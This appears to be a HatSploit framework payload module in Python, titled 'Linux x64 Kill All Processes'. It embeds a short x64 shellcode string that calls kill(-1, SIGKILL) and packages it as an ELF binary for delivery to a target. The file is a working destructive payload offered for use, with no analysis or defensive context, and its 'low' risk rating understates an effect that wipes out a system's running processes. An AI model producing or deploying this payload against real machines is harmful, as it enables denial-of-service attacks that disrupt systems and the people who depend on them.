#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatvenom import HatVenom
from hatsploit.base.payload import Payload


class HatSploitPayload(Payload, HatVenom):
    details = {
        'Category': "stager",
        'Name': "Linux x64 Kill All Processes",
        'Payload': "linux/x64/kill_all",
        'Authors': [
            'Ivan Nikolsky (enty8080)'
        ],
        'Description': "Kill all processes payload for Linux x64.",
        'Comments': [
            ''
        ],
        'Architecture': "x64",
        'Platform': "linux",
        'Risk': "low",
        'Type': "one_side"
    }

    def run(self):
        self.output_process("Generating shellcode...")
        shellcode = (
            b"\x6a\x3e\x58\x6a\xff\x5f\x6a\x09\x5e\x0f\x05"
        )

        self.output_process("Generating payload...")
        payload = self.generate('elf', 'x64', shellcode)

        return payload